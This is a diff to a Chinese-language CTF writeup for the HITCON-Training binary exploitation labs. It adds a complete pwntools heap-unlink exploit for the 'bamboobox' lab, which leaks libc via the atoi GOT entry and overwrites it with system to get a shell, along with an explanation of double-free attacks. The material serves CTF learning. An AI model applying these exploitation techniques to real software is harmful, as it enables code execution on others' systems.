@@ -2,7 +2,9 @@
 
 > 原文链接[M4x@10.0.0.55](http://www.cnblogs.com/WangAoBo/p/8570640.html)
 
-> 更新时间4月18
+> 项目地址[M4x's github](https://github.com/M4xW4n9/HITCON-Training-Writeup)，欢迎star~
+
+> 更新时间4月24
 
 复习一下二进制基础，写写HITCON-Training的writeup，题目地址：https://github.com/scwuaptx/HITCON-Training
 
@@ -576,7 +578,7 @@ io.close()
 exp:
 
 ```python
-lab10 [master●] cat exp.py 
+lab10 [master●] cat solve.py 
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-
 __Auther__ = 'M4x'
@@ -700,9 +702,87 @@ if __name__ == "__main__":
     io.close()
 ```
 
+
+
+#### unlink
+
+至于unlink，在这个[slide](https://github.com/M4xW4n9/slides/blob/master/pwn_heap/malloc-150821074656-lva1-app6891.pdf)中有较大篇幅的介绍，就不在说明原理了
+
+```python
+lab11 [master●] cat unlink.py 
+#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+__Auther__ = 'M4x'
+
+from pwn import *
+from time import sleep
+import sys
+context.arch = 'amd64'
+context.log_level = "debug"
+context.terminal = ["deepin-terminal", "-x", "sh", "-c"]
+
+io = process("./bamboobox")
+# process("./bamboobox").libc will assign libc.address but ELF("./bamboobox") won't
+#  libc = io.libc
+elf = ELF("./bamboobox")
+libc = elf.libc
+
+def DEBUG():
+	raw_input("DEBUG: ")
+	gdb.attach(io)
+
+def show():
+    io.sendlineafter(":", "1")
+
+def add(length, name):
+    io.sendlineafter(":", "2")
+    io.sendlineafter(":", str(length))
+    io.sendafter(":", name)
+
+def change(idx, length, name):
+    io.sendlineafter(":", "3")
+    io.sendlineafter(":", str(idx))
+    io.sendlineafter(":", str(length))
+    io.sendafter(":", name)
+
+def remove(idx):
+    io.sendlineafter(":", "4")
+    io.sendlineafter(":", str(idx))
+
+def exit():
+    io.sendlineafter(":", "5")
+
+if __name__ == "__main__":
+    add(0x40, '0' * 8)
+    add(0x80, '1' * 8)
+    add(0x40, '2' * 8)
+    ptr = 0x6020c8
+
+    fakeChunk = flat([0, 0x41, ptr - 0x18, ptr - 0x10, cyclic(0x20), 0x40, 0x90])
+    change(0, 0x80, fakeChunk)
+    remove(1)
+    payload = flat([0, 0, 0x40, elf.got['atoi']])
+    change(0, 0x80, payload)
+    show()
+    libc.address = u64(io.recvuntil("\x7f")[-6: ].ljust(8, '\x00')) - libc.sym['atoi']
+    success("libc.address -> {:#x}".format(libc.address))
+    #  libcBase = u64(io.recvuntil("\x7f")[-6: ].ljust(8, '\x00')) - libc.sym['atoi']
+    #  success("libcBase -> {:#x}".format(libcBase))
+    pause()
+
+    change(0, 0x8, p64(libc.sym['system']))
+    #  change(0, 0x8, p64(libcBase + libc.sym['system']))
+    io.sendline('$0')
+
+    io.interactive()
+    io.close()
+```
+
+可以看出，通过house of house直接控制函数指针进而控制ip的方法代码量少了不少，这也提醒我们不要放弃利用任何一个函数指针的机会
+
 ### lab12-secretgarden
 
-double free的题目，所谓double free，值得就是对同一个allocated chunk free两次，这样就可以把
+double free的题目，所谓double free，指的就是对同一个allocated chunk free两次，这样就可以形成一个类似**0  -> 1 -> 0**的cycled bin list，这样当我们malloc出0时，就可以修改bin list中0的fd，如**1 -> 0 -> target**，这样只要我们再malloc三次，并通过malloc的检查，就可以实现malloc到任何地址，进而实现任意地址写，至于double free的检查怎么绕过可以看这个[slide](https://github.com/M4xW4n9/slides/blob/master/pwn_heap/advanceheap-160113090848.pdf)
 
 ```python
 lab12 [master●] cat solve.py 
